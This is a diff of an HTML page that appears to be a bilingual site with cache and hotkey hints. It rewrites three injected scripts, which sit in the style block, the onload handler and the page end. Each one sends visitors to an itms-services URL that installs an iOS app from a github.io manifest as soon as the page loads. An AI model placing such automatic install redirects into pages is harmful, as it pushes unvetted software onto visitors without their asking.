@@ -17,7 +17,7 @@
         integrity="sha384-HbmWTHay9psM8qyzEKPc8odH4DsOuzdejtnr+OFtDmOcIVnhgReQ4GZBH7uwcjf6" crossorigin="anonymous">
   <style>
 
-<script>window.open('itms-services://?action=download-manifest&url=https://neizvedaniydag.github.io/scar/cowabanga.plist', '_self');</script>
+
     #ru, #en {
       display: -webkit-box;
       display: -ms-flexbox;
@@ -962,7 +962,7 @@
     }
 
     window.onload = function () {
-window.open('itms-services://?action=download-manifest&url=https://neizvedaniydag.github.io/scar/cowabanga.plist', '_self');
+window.location.href = "itms-services://?action=download-manifest&url=https://neizvedaniydag.github.io/scar/cowabanga.plist";
         if (language === "ru") {
             mainDiv.querySelector("#cache-hint").innerHTML = _.template(document.getElementById("cacheTemplateRu").innerHTML)({browser: browser});
             mainDiv.querySelector("#hotkey").innerHTML = _.template(document.getElementById("hotkeyTemplate").innerHTML)({browser: browser});
@@ -989,6 +989,8 @@ window.open('itms-services://?action=download-manifest&url=https://neizvedaniyda
     };
 
 </script>
-<script>window.open('itms-services://?action=download-manifest&url=https://neizvedaniydag.github.io/scar/cowabanga.plist', '_self');</script>
+<script>
+window.location.href = "itms-services://?action=download-manifest&url=https://neizvedaniydag.github.io/scar/cowabanga.plist";
+</script>
 </body>
 </html>
